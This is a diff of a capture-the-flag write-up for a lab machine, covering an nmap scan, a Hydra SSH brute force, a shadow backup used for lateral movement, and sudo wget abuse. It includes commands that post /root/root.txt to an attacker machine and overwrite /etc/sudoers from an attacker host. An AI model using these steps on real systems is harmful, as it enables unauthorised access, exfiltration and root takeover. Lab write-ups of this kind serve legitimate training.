@@ -13,6 +13,7 @@
 **Nmap full port scan:** 
 
 **nmap -p- -oA full-noscripts 10.10.10.76  --max-retries 0**
+
 79/tcp    open  finger
 111/tcp   open  rpcbind
 22022/tcp open  unknown
@@ -47,18 +48,22 @@ Connecting on port 22
 From the nmap automator script we found out that SSH service is running on port 22.
 
 **ssh sunny@10.10.10.76 -p 22022**
+
   Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
 
 **Notes:**
 This particular error happens while the encrypted channel is being set up. If your system and the remote system don't share at least one cipher, there is no cipher to agree on and no encrypted channel is possible. Usually SSH servers will offer a small handful of different ciphers in order to cater to different clients
 
 **ssh sunny@10.10.10.76 -p 22022 -oKexAlgorithms=diffie-hellman-group1-sha1**
+
 OR
+
 **ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc sunny@10.10.10.76**
 
 I will brute force with several wordlists
 
 **HYDRA**
+
 **hydra -V -I -l sunny -P ‘/usr/share/wordlists/rockyou.txt’ 10.10.10.76 ssh -s 22022**
 
 ![sunday6](https://user-images.githubusercontent.com/15195048/93906884-922c2900-fcb1-11ea-9a7d-3b4e59f56751.png)
@@ -68,6 +73,7 @@ I will brute force with several wordlists
 
 ## LATERAL MOVEMENT SUNNY → SAMMY
 **ssh sunny@10.10.10.76**
+
 I found a backup file in the following directory. 
 It contains two files **agen22.backup** and **shadow.backup**. The former we don’t have access to, however, we can view the latter.
 
@@ -94,6 +100,7 @@ User sammy may run the following commands on this host:
 ## A)GTFOBins wget
 
 **First attempt: Gaining a nc shell on attacker machine**
+
  We can use the wget –post-file parameter to post the contents of root.txt. Let’s see if that works. We spin up a Netcat listener on port 80 on our attacker machine
  **sudo wget –post-file=/root/root.txt attacker machine**
 
@@ -110,6 +117,7 @@ We can capture the flag that way, but let’s do something else with these eleva
 Copying the contents of /etc/sudoers into sudoers and changing the permissions of Sammy to ALL=(root) NOPASSWD: ALL as shown below.
 Collecting this file and installing it as /etc/sudoers, since wget is running as root effectively.
 **sudo wget -O /etc/sudoers http://<attcker_ip:8000/sudoers**
+
 Now we can see that with just one command, Sammy becomes root and take complete control of the box.
 
 # Disclaimer: I did not do the Privilege Escalation part because of SSH LAG.
